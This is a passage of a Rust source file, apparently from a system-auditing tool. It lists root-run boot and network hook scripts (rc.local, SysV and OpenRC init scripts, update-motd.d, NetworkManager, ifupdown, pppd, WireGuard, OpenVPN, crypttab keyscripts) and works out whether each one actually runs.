//! Pre-systemd and boot-adjacent execution (§5): rc.local, the SysV init
//! scripts with their runlevel links and OpenRC's, update-motd.d, the hooks
//! network software runs (NetworkManager's dispatcher, ifupdown, pppd, dhclient
//! and dhcpcd, WireGuard, OpenVPN, ifplugd, networkd-dispatcher), and crypttab
//! keyscripts.
//!
//! One collector because all are the same material — a root-owned script that
//! some supervisor executes — and the same question is asked of each: does
//! anything actually run it? For SysV that question is the whole job. A script
//! in /etc/init.d runs under SysV or systemd's generator only when an S-link
//! in the /etc/rc?.d it reads points at it (OpenRC reads /etc/runlevels
//! instead), which is the SysV shape of the `.wants` problem systemd has, and
//! treating presence in init.d as enablement is the defect this avoids.

use crate::entry::key;
use crate::text::{normalize};
use std::collections::{BTreeMap, BTreeSet};
use std::ffi::OsStr;
use std::os::unix::ffi::OsStrExt;
use std::path::{Path, PathBuf};

use crate::entry::{Enablement, Entry, Flag, Kind, Trigger, hex, name_from_os};
use crate::scan::{Collector, Ctx, Read};

pub struct InitScripts;

/// init, pam_motd and NetworkManager all run as root, so everything below
/// them does too.
const ROOT: &str = "root";

const RC_LOCAL: &[&str] = &["etc/rc.local", "etc/rc.d/rc.local", "etc/rc.local.shutdown"];

/// /etc/init.d is a symlink to /etc/rc.d/init.d on the rpm distributions, so
/// these two names are one directory there and two on Debian.
const INIT_DIRS: &[&str] = &["etc/init.d", "etc/rc.d/init.d"];

const RUNLEVELS: &[&str] = &["0", "1", "2", "3", "4", "5", "6", "S"];

const MOTD_DIR: &str = "etc/update-motd.d";

const NM_DIRS: &[&str] = &[
    "etc/NetworkManager/dispatcher.d",
    "usr/lib/NetworkManager/dispatcher.d",
    "lib/NetworkManager/dispatcher.d",
];

/// Subdirectories of dispatcher.d, each a different moment in an interface
/// state change at which NetworkManager runs what it finds.
const NM_PHASES: &[&str] = &["pre-up.d", "pre-down.d", "no-wait.d"];

/// How far into a script the head scan reads. Recorded on every entry it
/// touches, so a clean scan is never mistaken for a whole-file one.
const SCAN_LINES: usize = 200;

impl Collector for InitScripts {
    fn name(&self) -> &'static str {
        "initscripts"
    }

    fn collect(&self, cx: &mut Ctx) -> Vec<Entry> {
        let mut out = rc_local(cx);
        out.extend(sysv(cx));
        let run_parts = super::run_parts_flavour(cx);
        out.extend(motd(cx, run_parts));
        out.extend(dispatcher(cx));
        out.extend(dhclient_hooks(cx));
        out.extend(dhcpcd_hooks(cx));
        out.extend(crypttab(cx));
        out.extend(networkd_dispatcher(cx));
        // The run-parts binary is read once for all that use it.
        out.extend(ifupdown(cx, run_parts));
        out.extend(ppp(cx, run_parts));
        out.extend(wireguard(cx));
        out.extend(openvpn(cx));
        out.extend(ifplugd(cx, run_parts));
        out
    }
}



// ------------------------------------------------------- network hooks ----

/// networkd-dispatcher runs, on each state change systemd-networkd reports,
/// the files in `<state>.d` under /etc/networkd-dispatcher and then
/// /usr/lib/networkd-dispatcher, by name, the first of a name to pass its
/// checks winning: the directory exactly 0755 root:root, not following
/// links, and the file, after following them, the same. Anything else it
/// passes over.
const NETWORKD_STATES: [&str; 16] = [
    "configured", "configuring", "failed", "pending", "unmanaged", "linger", "initialized", "carrier", "degraded",
    "degraded-carrier", "dormant", "enslaved", "missing", "no-carrier", "off", "routable",
];

fn networkd_dispatcher(cx: &mut Ctx) -> Vec<Entry> {
    let mut out = Vec::new();
    let exact = |m: &crate::root::Meta| m.uid == 0 && m.gid == 0 && m.mode & 0o7777 == 0o755;
    for state in NETWORKD_STATES {
        let dirs: Vec<PathBuf> =
            ["etc/networkd-dispatcher", "usr/lib/networkd-dispatcher"].iter().map(|d| Path::new(d).join(format!("{state}.d"))).collect();
        let mut names: BTreeSet<std::ffi::OsString> = BTreeSet::new();
        for d in &dirs {
            names.extend(cx.dir(d).into_iter().filter(|e| !e.is_dir).map(|e| e.name));
        }
        for name in names {
            let mut chosen = false;
            for d in &dirs {
                let rel = d.join(&name);
                let Ok(meta) = cx.root.stat_follow(&rel) else { continue };
                if !meta.is_file {
                    continue;
                }
                let mut e = script_entry(cx, Kind::NetworkDispatcher, &rel, &name, Trigger::NetworkEvent);
                e.note("dispatcher", "networkd-dispatcher");
                e.note("hook_phase", state);
                let dir_ok = cx.root.stat(d).is_ok_and(|m| exact(&m));
                e.enabled = if chosen {
                    e.note("shadowed", "an earlier directory's file of this name runs instead");
                    Enablement::Disabled
                } else if !dir_ok || !exact(&meta) {
                    e.note("not_run", "networkd-dispatcher runs only mode 0755 root:root, in a 0755 root:root directory");
                    Enablement::Disabled
                } else {
                    chosen = true;
                    Enablement::Enabled
                };
                out.push(e);
            }
        }
    }
    out
}

/// ifupdown (0.8), off where it is not installed: what `run-parts` selects in
/// /etc/network/if-{pre-up,up,down,post-down}.d, run as root around each
/// interface, and the commands the `pre-up`, `up`, `post-up`, `pre-down`,
/// `down` and `post-down` options of /etc/network/interfaces give, with
/// the files its `source` lines name.
fn ifupdown(cx: &mut Ctx, flavour: super::RunParts) -> Vec<Entry> {
    let mut out = Vec::new();
    let installed = ["sbin/ifup", "usr/sbin/ifup"].iter().any(|p| cx.root.exists(p));
    for phase in ["pre-up", "up", "down", "post-down"] {
        let dir = PathBuf::from(format!("etc/network/if-{phase}.d"));
        for f in super::run_parts_dir(cx, flavour, &dir) {
            let mut e = script_entry(cx, Kind::NetworkDispatcher, &f.rel, &f.name, Trigger::NetworkEvent);
            e.note("dispatcher", "ifupdown");
            e.note("hook_phase", phase);
            e.enabled = Enablement::Enabled;
            if let Some(why) = f.not_run {
                e.enabled = Enablement::Disabled;
                e.note("not_run", why);
            }
            out.push(e);
        }
    }
    let mut seen = BTreeSet::new();
    interfaces(cx, Path::new("etc/network/interfaces"), 0, &mut seen, &mut out);
    if !installed {
        for e in &mut out {
            e.enabled = Enablement::Disabled;
            e.note("not_run", "ifupdown is not installed");
        }
    }
    out
}

fn interfaces(cx: &mut Ctx, rel: &Path, depth: usize, seen: &mut BTreeSet<PathBuf>, out: &mut Vec<Entry>) {
    if depth > 8 || !seen.insert(rel.to_path_buf()) {
        return;
    }
    let Some(bytes) = cx.read_capped(rel, 256 * 1024) else { return };
    let mut iface = String::new();
    for line in bytes.split(|b| *b == b'\n') {
        let t = line.trim_ascii();
        if t.is_empty() || t[0] == b'#' {
            continue;
        }
        let word_end = t.iter().position(|b| b.is_ascii_whitespace()).unwrap_or(t.len());
        let (word, rest) = (&t[..word_end], t[word_end..].trim_ascii());
        match word {
            b"iface" => iface = String::from_utf8_lossy(rest.split(|b| b.is_ascii_whitespace()).next().unwrap_or_default()).into_owned(),
            b"source" | b"source-directory" => {
                let spec = rest.strip_prefix(b"/").unwrap_or(rest);
                let target = if rest.starts_with(b"/") { PathBuf::from(OsStr::from_bytes(spec)) } else { rel.parent().unwrap_or(Path::new("")).join(OsStr::from_bytes(spec)) };
                let files = if word == b"source-directory" {
                    // Like run-parts: names of letters, digits, _ and -.
                    let mut v: Vec<PathBuf> = cx
                        .dir(&target)
                        .into_iter()
                        .filter(|e| !e.is_dir && e.name.as_encoded_bytes().iter().all(|b| b.is_ascii_alphanumeric() || *b == b'_' || *b == b'-'))
                        .map(|e| target.join(e.name))
                        .collect();
                    v.sort();
                    v
                } else {
                    super::expand_glob(cx, &target)
                };
                for f in files {
                    interfaces(cx, &f, depth + 1, seen, out);
                }
            }
            b"pre-up" | b"up" | b"post-up" | b"pre-down" | b"down" | b"post-down" if !rest.is_empty() => {
                let phase = String::from_utf8_lossy(word).into_owned();
                let mut e = cx.entry(Kind::NetworkDispatcher, rel, format!("{iface}:{phase}:{}", hex(&blake3::hash(rest).as_bytes()[..6])));
                e.trigger = Trigger::NetworkEvent;
                e.principal = Some("root".into());
                e.enabled = Enablement::Enabled;
                e.note("dispatcher", "ifupdown");
                e.note("interface", iface.clone());
                e.note("hook_phase", phase);
                e.command = Some(rest.to_vec());
                out.push(e);
            }
            _ => {}
        }
    }
}

/// pppd's /etc/ppp/ip-up and ip-down (Debian's ppp) run `run-parts` over
/// their `.d` directories, IPv6 likewise, unless an executable ip-up.local
/// or ip-down.local exists, which they exec instead.
fn ppp(cx: &mut Ctx, flavour: super::RunParts) -> Vec<Entry> {
    let mut out = Vec::new();
    if !["usr/sbin/pppd", "sbin/pppd"].iter().any(|p| cx.root.exists(p)) {
        return out;
    }
    for phase in ["ip-up", "ip-down", "ipv6-up", "ipv6-down"] {
        let local = PathBuf::from(format!("etc/ppp/{phase}.local"));
        let local_runs = exec_mode(cx, &local) != 0 && phase.starts_with("ip-");
        if cx.root.exists(&local) {
            let mut e = script_entry(cx, Kind::NetworkDispatcher, &local, OsStr::new(&format!("{phase}.local")), Trigger::NetworkEvent);
            e.note("dispatcher", "pppd");
            e.note("hook_phase", phase);
            e.enabled = if local_runs { Enablement::Enabled } else { Enablement::Disabled };
            out.push(e);
        }
        let dir = PathBuf::from(format!("etc/ppp/{phase}.d"));
        for f in super::run_parts_dir(cx, flavour, &dir) {
            let mut e = script_entry(cx, Kind::NetworkDispatcher, &f.rel, &f.name, Trigger::NetworkEvent);
            e.note("dispatcher", "pppd");
            e.note("hook_phase", phase);
            e.enabled = Enablement::Enabled;
            if let Some(why) = f.not_run {
                e.enabled = Enablement::Disabled;
                e.note("not_run", why);
            } else if local_runs {
                e.enabled = Enablement::Disabled;
                e.note("not_run", format!("{phase}.local runs instead"));
            }
            out.push(e);
        }
    }
    out
}

/// wg-quick runs an interface's PreUp, PostUp, PreDown and PostDown with
/// bash, as root, from /etc/wireguard/<name>.conf. It runs where
/// wg-quick@<name>.service is enabled, and wherever someone runs wg-quick,
/// which is left unknown.
fn wireguard(cx: &mut Ctx) -> Vec<Entry> {
    let mut out = Vec::new();
    let dir = Path::new("etc/wireguard");
    let ents = cx.dir(dir);
    for ent in ents {
        let Some(iface) = ent.name.to_str().and_then(|n| n.strip_suffix(".conf")).map(str::to_string) else { continue };
        let rel = dir.join(&ent.name);
        let Some(bytes) = cx.read_capped(&rel, 256 * 1024) else { continue };
        let unit = format!("wg-quick@{iface}.service");
        let enabled = cx.dir("etc/systemd/system").into_iter().filter(|e| e.is_dir && e.name.as_encoded_bytes().ends_with(b".wants")).any(|w| {
            cx.root.exists(Path::new("etc/systemd/system").join(&w.name).join(&unit))
        });
        let mut section = Vec::new();
        for line in bytes.split(|b| *b == b'\n') {
            let t = line.trim_ascii();
            if t.starts_with(b"[") {
                section = t.to_vec();
                continue;
            }
            let Some(eq) = t.iter().position(|b| *b == b'=') else { continue };
            let key = t[..eq].trim_ascii();
            let value = t[eq + 1..].trim_ascii();
            if section != b"[Interface]" || !matches!(key, b"PreUp" | b"PostUp" | b"PreDown" | b"PostDown") || value.is_empty() {
                continue;
            }
            let key = String::from_utf8_lossy(key).into_owned();
            let mut e = cx.entry(Kind::NetworkDispatcher, &rel, format!("{iface}:{key}:{}", hex(&blake3::hash(value).as_bytes()[..6])));
            e.trigger = Trigger::NetworkEvent;
            e.principal = Some("root".into());
            e.note("dispatcher", "wg-quick");
            e.note("interface", iface.clone());
            e.note("hook_phase", key);
            e.command = Some(value.to_vec());
            e.enabled = if enabled { Enablement::Enabled } else { Enablement::Unknown };
            if !enabled {
                e.note("depends_on", format!("{unit}, not enabled, or wg-quick run by hand"));
            }
            out.push(e);
        }
    }
    out
}

/// OpenVPN (2.6, Debian's units): each configuration is started by its own
/// template unit, whose working directory resolves a relative path: *.conf
/// in /etc/openvpn by openvpn@, which passes `--script-security 2`, and
/// client/*.conf and server/*.conf by openvpn-client@ and openvpn-server@,
/// which do not, so there a configuration's scripts run only if it sets
/// `script-security 2` or higher itself. A `plugin` is loaded either way.
/// On where the configuration's unit is enabled, unknown elsewhere.
const OPENVPN_SCRIPTS: [&str; 12] = [
    "up", "down", "route-up", "route-pre-down", "ipchange", "client-connect", "client-disconnect", "learn-address",
    "auth-user-pass-verify", "tls-verify", "client-crresponse", "plugin",
];

/// An OpenVPN configuration line's words: `"`, `'` and backslash quoting,
/// `#` or `;` starting a comment where a word would.
fn openvpn_words(line: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut cur = String::new();
    let (mut quote, mut escape, mut in_word) = (None, false, false);
    for c in line.chars() {
        if escape {
            cur.push(c);
            escape = false;
            continue;
        }
        match (c, quote) {
            ('\\', q) if q != Some('\'') => escape = true,
            ('"' | '\'', None) => {
                quote = Some(c);
                in_word = true;
            }
            (c, Some(q)) if c == q => quote = None,
            (c, None) if c.is_whitespace() => {
                if in_word {
                    out.push(std::mem::take(&mut cur));
                    in_word = false;
                }
            }
            ('#' | ';', None) if !in_word => break,
            (c, _) => {
                cur.push(c);
                in_word = true;
            }
        }
    }
    if in_word {
        out.push(cur);
    }
    out
}

fn openvpn(cx: &mut Ctx) -> Vec<Entry> {
    let mut out = Vec::new();
    let installed = cx.root.exists("usr/sbin/openvpn");
    let wants: Vec<PathBuf> = cx
        .dir("etc/systemd/system")
        .into_iter()
        .filter(|e| e.is_dir && e.name.as_encoded_bytes().ends_with(b".wants"))
        .map(|e| Path::new("etc/systemd/system").join(e.name))
        .collect();
    for (dir, unit, cli_security) in
        [("etc/openvpn", "openvpn@", true), ("etc/openvpn/client", "openvpn-client@", false), ("etc/openvpn/server", "openvpn-server@", false)]
    {
        let names: Vec<_> =
            cx.dir(dir).into_iter().filter(|e| !e.is_dir && e.name.as_encoded_bytes().ends_with(b".conf")).map(|e| e.name).collect();
        for name in names {
            let rel = Path::new(dir).join(&name);
            let Some(bytes) = cx.read_capped(&rel, 256 * 1024) else { continue };
            let text = String::from_utf8_lossy(&bytes);
            let instance = name.to_string_lossy().trim_end_matches(".conf").to_string();
            let unit = format!("{unit}{instance}.service");
            let enabled = wants.iter().any(|w| cx.root.exists(w.join(&unit)));
            let lines: Vec<Vec<String>> = text.lines().map(openvpn_words).filter(|w| !w.is_empty()).collect();
            let security = lines
                .iter()
                .rev()
                .find(|w| w[0] == "script-security")
                .and_then(|w| w.get(1)?.parse::<u32>().ok())
                .unwrap_or(if cli_security { 2 } else { 1 });
            for words in &lines {
                let option = words[0].as_str();
                let Some(arg) = words.get(1).filter(|_| OPENVPN_SCRIPTS.contains(&option)) else { continue };
                let mut e = cx.entry(Kind::NetworkDispatcher, &rel, format!("{instance}:{option}:{}", hex(&blake3::hash(arg.as_bytes()).as_bytes()[..6])));
                e.trigger = Trigger::NetworkEvent;
                e.principal = Some("root".into());
                e.note("dispatcher", "openvpn");
                e.note("hook_phase", option);
                e.note("unit", unit.clone());
                let command = words[1..].join(" ");
                // A relative path is taken from the unit's working directory.
                if let Some(first) = arg.split_whitespace().next() {
                    let path = if first.starts_with('/') { PathBuf::from(first) } else { Path::new("/").join(dir).join(first) };
                    e.target_path = Some(path);
                }
                e.command = Some(command.into_bytes());
                e.enabled = if enabled { Enablement::Enabled } else { Enablement::Unknown };
                if !enabled {
                    e.note("depends_on", format!("{unit}, not enabled, or openvpn run by hand"));
                }
                if option != "plugin" && security < 2 {
                    e.enabled = Enablement::Disabled;
                    e.note("not_run", "script-security below 2 runs no external program");
                }
                if !installed {
                    e.enabled = Enablement::Disabled;
                    e.note("not_run", "openvpn is not installed");
                }
                out.push(e);
            }
        }
    }
    out
}

/// ifplugd's action script (Debian's) runs `run-parts` over
/// /etc/ifplugd/action.d on each link going up or down.
fn ifplugd(cx: &mut Ctx, flavour: super::RunParts) -> Vec<Entry> {
    let mut out = Vec::new();
    if !cx.root.exists("usr/sbin/ifplugd") {
        return out;
    }
    for f in super::run_parts_dir(cx, flavour, Path::new("etc/ifplugd/action.d")) {
        let mut e = script_entry(cx, Kind::NetworkDispatcher, &f.rel, &f.name, Trigger::NetworkEvent);
        e.note("dispatcher", "ifplugd");
        e.enabled = Enablement::Enabled;
        if let Some(why) = f.not_run {
            e.enabled = Enablement::Disabled;
            e.note("not_run", why);
        }
        out.push(e);
    }
    out
}
// ------------------------------------------------------------ crypttab ----

/// `keyscript=` in /etc/crypttab: a program run as root at boot, its output
/// taken as the key to unlock the device. Only Debian's cryptsetup scripts
/// honour it, in the initramfs for the devices unlocked there and in
/// cryptdisks; systemd-cryptsetup ignores it. So whether it runs depends on
/// how the device is unlocked, which is left unknown. A name without a
/// slash is a script in /lib/cryptsetup/scripts (crypttab(5)).
fn crypttab(cx: &mut Ctx) -> Vec<Entry> {
    let mut out = Vec::new();
    let rel = Path::new("etc/crypttab");
    let Some(bytes) = cx.read_capped(rel, 256 * 1024) else { return out };
    for line in bytes.split(|b| *b == b'\n') {
        let fields: Vec<&[u8]> = line.split(|b| b.is_ascii_whitespace()).filter(|f| !f.is_empty()).collect();
        if fields.first().is_none_or(|f| f.starts_with(b"#")) || fields.len() < 4 {
            continue;
        }
        for opt in fields[3].split(|b| *b == b',') {
            let Some(script) = opt.strip_prefix(b"keyscript=").filter(|s| !s.is_empty()) else { continue };
            let path = if script.contains(&b'/') {
                PathBuf::from(std::ffi::OsStr::from_bytes(script))
            } else {
                Path::new("/lib/cryptsetup/scripts").join(std::ffi::OsStr::from_bytes(script))
            };
            let target = String::from_utf8_lossy(fields[0]).into_owned();
            let mut e = cx.entry(Kind::Crypttab, rel, format!("keyscript:{target}"));
            e.trigger = Trigger::Boot;
            e.principal = Some("root".into());
            e.enabled = Enablement::Unknown;
            e.note("device", String::from_utf8_lossy(fields[1]).into_owned());
            e.note("key", String::from_utf8_lossy(fields[2]).into_owned());
            e.note("depends_on", "unlocked by Debian's cryptsetup scripts (initramfs or cryptdisks), not systemd-cryptsetup");
            e.command = Some([path.as_os_str().as_bytes(), b" ", fields[2]].concat());
            e.target_path = Some(path);
            out.push(e);
        }
    }
    out
}
// ------------------------------------------------------------ rc.local ----

fn rc_local(cx: &mut Ctx) -> Vec<Entry> {
    let mut out = Vec::new();
    for rel in RC_LOCAL {
        let rel = Path::new(rel);
        let Ok(meta) = cx.root.stat(rel) else { continue };
        if meta.is_dir {
            continue;
        }
        let name = rel.file_name().unwrap_or_else(|| OsStr::new("rc.local"));
        let mut e = script_entry(cx, Kind::RcLocal, rel, name, Trigger::Boot);
        // systemd's rc-local.service carries ConditionFileIsExecutable and
        // Debian's own /etc/init.d/rc.local tests -x: without the bit the
        // file is inert no matter what it contains.
        let exec = exec_mode(cx, rel) != 0;
        e.enabled = if exec { Enablement::Enabled } else { Enablement::Disabled };
        e.note("executable", exec.to_string());
        out.push(e);
    }
    out
}

// ---------------------------------------------------------------- SysV ----

/// What the rc?.d links say about one init.d script.
#[derive(Default)]
struct Links {
    start: BTreeSet<String>,
    stop: BTreeSet<String>,
    priority: BTreeSet<String>,
    /// Runlevels whose start links nothing here reads: systemd's generator
    /// looks only at rc1.d to rc5.d.
    unread: BTreeSet<String>,
}

/// Whether PID 1 is systemd, from what /sbin/init leads to.
fn init_is_systemd(cx: &Ctx) -> bool {
    cx.root.resolve(Path::new("sbin/init")).ok().is_some_and(|p| p.file_name().is_some_and(|n| n == "systemd"))
}

fn sysv(cx: &mut Ctx) -> Vec<Entry> {
    let openrc = openrc_state(cx);
    let mut dirs: Vec<((), PathBuf)> = Vec::new();
    if openrc.is_some() {
        dirs.extend(OPENRC_PREFIXES.iter().map(|p| ((), PathBuf::from(p).join("init.d"))));
    }
    dirs.extend(INIT_DIRS.iter().map(|d| ((), PathBuf::from(*d))));
    let init_dirs = cx.distinct_dirs(dirs);
    let init_ids: BTreeSet<(u64, u64)> = init_dirs.iter().map(|(_, id, _)| *id).collect();
    let kind = if openrc.is_some() { Kind::OpenrcService } else { Kind::SysvInit };
    let systemd = init_is_systemd(cx);

    let mut scripts: Vec<Entry> = Vec::new();
    let mut links: Vec<Links> = Vec::new();
    let mut index: BTreeMap<((u64, u64), Vec<u8>), usize> = BTreeMap::new();
    // OpenRC finds a service by name in the first init.d that has it.
    let mut first_of_name: BTreeSet<Vec<u8>> = BTreeSet::new();

    for (_, id, dir) in &init_dirs {
        for ent in cx.dir(dir) {
            // insserv writes .depend.boot, .depend.start and .depend.stop as
            // caches of the dependency graph; nothing executes them.
            if ent.is_dir || ent.name.as_bytes().starts_with(b".depend.") {
                continue;
            }
            let rel = dir.join(&ent.name);
            let mut e = script_entry(cx, kind, &rel, &ent.name, Trigger::Boot);
            if openrc.is_some() && !first_of_name.insert(ent.name.as_bytes().to_vec()) {
                e.note(key::SHADOWED_BY, "a script of the same name in an earlier init.d");
            }
            index.insert((*id, ent.name.as_bytes().to_vec()), scripts.len());
            scripts.push(e);
            links.push(Links::default());
        }
    }

    let candidates = RUNLEVELS
        .iter()
        .flat_map(|lvl| {
            [PathBuf::from(format!("etc/rc{lvl}.d")), PathBuf::from(format!("etc/rc.d/rc{lvl}.d"))]
                .map(|d| ((*lvl).to_string(), d))
        })
        .collect();

    let mut out = Vec::new();
    for (level, _, dir) in cx.distinct_dirs(candidates) {
        for ent in cx.dir(&dir) {
            let raw = ent.name.as_bytes();
            // /etc/init.d/rc globs S* and K*; anything else in the directory
            // is never run, whatever it is.
            let starts = match raw.first() {
                Some(b'S') => true,
                Some(b'K') => false,
                _ => continue,
            };
            if ent.is_dir {
                continue;
            }
            let digits = raw[1..].iter().take_while(|b| b.is_ascii_digit()).count();
            let priority = String::from_utf8_lossy(&raw[1..1 + digits]).into_owned();
            let rel = dir.join(&ent.name);

            // Resolution is left to the kernel rather than done lexically: on
            // a distribution where /etc/rc2.d is itself a symlink, `..` in the
            // link target does not mean what the text says it means.
            let target = if ent.is_symlink { cx.root.read_link(&rel).ok() } else { None };
            let joined = target.as_ref().map(|t| dir.join(t));
            let parent_id = joined
                .as_deref()
                .and_then(Path::parent)
                .and_then(|p| cx.root.dir_identity(p).ok());
            let script = match (parent_id, joined.as_deref().and_then(Path::file_name)) {
                (Some(id), Some(base)) => index.get(&(id, base.as_bytes().to_vec())).copied(),
                _ => None,
            };

            // systemd-sysv-generator reads rc1.d to rc5.d and nothing else, so a
            // start link in rc0.d, rc6.d or rcS.d is run by sysvinit and by no
            // one under systemd.
            let unread = systemd && starts && matches!(level.as_str(), "0" | "6" | "S");
            match script {
                Some(i) => {
                    let l = &mut links[i];
                    if unread {
                        l.unread.insert(level.clone());
                    } else if starts {
                        l.start.insert(level.clone());
                        if !priority.is_empty() {
                            l.priority.insert(priority);
                        }
                    } else {
                        l.stop.insert(level.clone());
                    }
                }
                None => {
                    // A runlevel link naming something outside init.d is not a
                    // bookkeeping detail: it is code the runlevel starts from
                    // a place nobody enumerates.
                    let mut e = script_entry(cx, Kind::SysvInit, &rel, &ent.name, Trigger::Boot);
                    e.enabled =
                        if starts && !unread { Enablement::Enabled } else { Enablement::Disabled };
                    if unread {
                        e.note("not_run", "systemd reads only rc1.d to rc5.d");
                    }
                    e.note("runlevel", level.clone());
                    e.note("action", if starts { "start" } else { "stop" });
                    if !priority.is_empty() {
                        e.note("priority", priority);
                    }
                    if !parent_id.is_some_and(|id| init_ids.contains(&id)) {
                        e.note("outside_init_d", "true");
                    }
                    if !ent.is_symlink {
                        e.note("not_a_symlink", "true");
                    }
                    if let Some(j) = &joined {
                        e.target_path = Some(cx.root.abs(normalize(j)));
                    }
                    if openrc.is_some() {
                        // OpenRC never reads rc?.d; a link there starts
                        // nothing until something else does.
                        e.enabled = Enablement::Disabled;
                        e.note("not_run", "OpenRC reads /etc/runlevels, not rc?.d");
                    }
                    out.push(e);
                }
            }
        }
    }

    let mut conf_d: BTreeSet<PathBuf> = BTreeSet::new();
    for (i, mut e) in scripts.into_iter().enumerate() {
        let l = &links[i];
        match &openrc {
            None => {
                // The whole point: an S-link somewhere is enablement, sitting
                // in init.d is not.
                e.enabled = if l.start.is_empty() { Enablement::Disabled } else { Enablement::Enabled };
            }
            Some(rc) => openrc_service(cx, rc, &mut e, &mut conf_d),
        }
        for (key, set) in [
            ("start_runlevels", &l.start),
            ("stop_runlevels", &l.stop),
            ("start_priority", &l.priority),
            ("unread_runlevels", &l.unread),
        ] {
            if !set.is_empty() {
                e.note(key, set.iter().cloned().collect::<Vec<_>>().join(", "));
            }
        }
        out.push(e);
    }
    if let Some(rc) = &openrc {
        out.extend(openrc_extras(cx, rc, &first_of_name, conf_d));
    }
    out
}

// --------------------------------------------------------------- OpenRC ----

/// OpenRC's search prefixes as Alpine builds it, in its own order: a script
/// or a conf.d file in an earlier prefix is found first.
const OPENRC_PREFIXES: [&str; 3] = ["usr/local/etc", "usr/etc", "etc"];
const OPENRC_RUN: [&str; 2] = ["sbin/openrc-run", "usr/sbin/openrc-run"];
const OPENRC_RUNLEVELS: &str = "etc/runlevels";
/// The runlevels rc starts on the way to any other: sysinit, then boot.
const OPENRC_BOOT_LEVELS: [&str; 2] = ["sysinit", "boot"];

/// What /etc/runlevels says, once read as OpenRC reads it.
struct Openrc {
    /// Each runlevel directory: the service names in it (any entry that
    /// exists, is not a dotfile and does not end in .sh, as ls_dir lists
    /// them), and the runlevels it stacks (its subdirectories that name one).
    levels: BTreeMap<String, (BTreeSet<String>, Vec<String>)>,
    /// The levels whose services start at boot: sysinit, boot, and whatever
    /// inittab hands to `openrc`.
    boot: BTreeSet<String>,
}

/// OpenRC is the service manager where openrc-run is installed and PID 1 is
/// not systemd, which never runs it: sysvinit and BusyBox start it from
/// inittab. Under systemd the same init.d scripts run through
/// systemd-sysv-generator from their rc?.d links, and read as SysV.
fn openrc_state(cx: &mut Ctx) -> Option<Openrc> {
    if !OPENRC_RUN.iter().any(|p| cx.root.exists(p)) {
        return None;
    }
    if init_is_systemd(cx) {
        return None;
    }
    let mut levels: BTreeMap<String, (BTreeSet<String>, Vec<String>)> = BTreeMap::new();
    let names: Vec<String> = cx
        .dir(OPENRC_RUNLEVELS)
        .into_iter()
        .filter(|e| e.is_dir && !e.name.as_bytes().starts_with(b"."))
        .map(|e| e.name.to_string_lossy().into_owned())
        .collect();
    for level in &names {
        let dir = Path::new(OPENRC_RUNLEVELS).join(level);
        let mut services = BTreeSet::new();
        let mut stacked = Vec::new();
        for ent in cx.dir(&dir) {
            let raw = ent.name.as_bytes();
            if raw.starts_with(b".") {
                continue;
            }
            // ls_dir stats through the link: a dangling one is not there.
            let Ok(meta) = cx.root.stat_follow(dir.join(&ent.name)) else { continue };
            let name = ent.name.to_string_lossy().into_owned();
            // A subdirectory naming another runlevel stacks it. Any other is
            // a name like the rest: OpenRC's ls_dir has no directory filter and
            // rc_service_in_runlevel is only an access(2).
            if meta.is_dir && names.contains(&name) && name != *level {
                stacked.push(name);
                continue;
            }
            if raw.ends_with(b".sh") {
                continue;
            }
            services.insert(name);
        }
        levels.insert(level.clone(), (services, stacked));
    }
    let mut boot: BTreeSet<String> = OPENRC_BOOT_LEVELS.iter().map(|s| s.to_string()).collect();
    if let Some(bytes) = cx.read("etc/inittab") {
        for line in bytes.split(|b| *b == b'\n') {
            let process = line.rsplit(|b| *b == b':').next().unwrap_or(line);
            let words: Vec<&[u8]> = process.split(|b| b.is_ascii_whitespace()).filter(|w| !w.is_empty()).collect();
            for pair in words.windows(2) {
                if pair[0].ends_with(b"openrc") && !pair[1].starts_with(b"-") {
                    boot.insert(String::from_utf8_lossy(pair[1]).into_owned());
                }
            }
        }
    }
    Some(Openrc { levels, boot })
}

impl Openrc {
    /// The runlevels a service is in, its stacked runlevels followed the
    /// way get_runlevel_chain follows them, a loop stopping where it started.
    fn runlevels_of(&self, service: &str) -> Vec<String> {
        let mut out = Vec::new();
        for level in self.levels.keys() {
            let mut seen: BTreeSet<&str> = BTreeSet::new();
            let mut todo = vec![level.as_str()];
            let mut found = false;
            while let Some(l) = todo.pop() {
                if !seen.insert(l) {
                    continue;
                }
                let Some((services, stacked)) = self.levels.get(l) else { continue };
                if services.contains(service) {
                    found = true;
                    break;
                }
                todo.extend(stacked.iter().map(String::as_str));
            }
            if found {
                out.push(level.clone());
            }
        }
        out
    }
}

/// Enablement and notes for one init.d script under OpenRC: a name in a
/// runlevel is what starts it — rc_service_in_runlevel is access(F_OK) on
/// /etc/runlevels/<level>/<name>, whatever the entry is — and the conf.d
/// files openrc-run sources for it before its own code are recorded and
/// become entries of their own.
fn openrc_service(cx: &mut Ctx, rc: &Openrc, e: &mut Entry, conf_d: &mut BTreeSet<PathBuf>) {
    let name = e.name.clone();
    if name.ends_with(".sh") {
        e.enabled = Enablement::Disabled;
        e.note("not_run", ".sh files are not init scripts to OpenRC");
        return;
    }
    if e.raw.contains_key(key::SHADOWED_BY) {
        e.enabled = Enablement::Disabled;
        return;
    }
    let levels = rc.runlevels_of(&name);
    e.enabled = if levels.is_empty() { Enablement::Disabled } else { Enablement::Enabled };
    if !levels.is_empty() {
        e.note("runlevels", levels.join(", "));
        e.note("starts_at_boot", levels.iter().any(|l| rc.boot.contains(l)).to_string());
    }
    // net.eth0 loads conf.d/net and then conf.d/net.eth0; each may have a
    // per-runlevel variant that replaces it in that runlevel.
    let mut stems: Vec<String> = Vec::new();
    if let Some((base, _)) = name.split_once('.') {
        stems.push(base.to_string());
    }
    stems.push(name.clone());
    let mut sourced: Vec<String> = Vec::new();
    for prefix in OPENRC_PREFIXES.iter().rev() {
        for stem in &stems {
            let mut files = vec![format!("{prefix}/conf.d/{stem}")];
            files.extend(rc.levels.keys().map(|l| format!("{prefix}/conf.d/{stem}.{l}")));
            for f in files {
                if cx.root.stat_follow(&f).is_ok_and(|m| m.is_file) {
                    sourced.push(cx.root.abs(&f).display().to_string());
                    conf_d.insert(PathBuf::from(f));
                }
            }
        }
    }
    if !sourced.is_empty() {
        e.note("conf_d", sourced.join(", "));
    }
}

/// What OpenRC runs besides the scripts: rc.conf and rc.conf.d, sourced by
/// every service; the conf.d files the services above source; local.d,
/// whose executable *.start and *.stop files the `local` service runs with
/// eval; and a name in a runlevel that no init.d holds, which rc reports as
/// a service that does not exist.
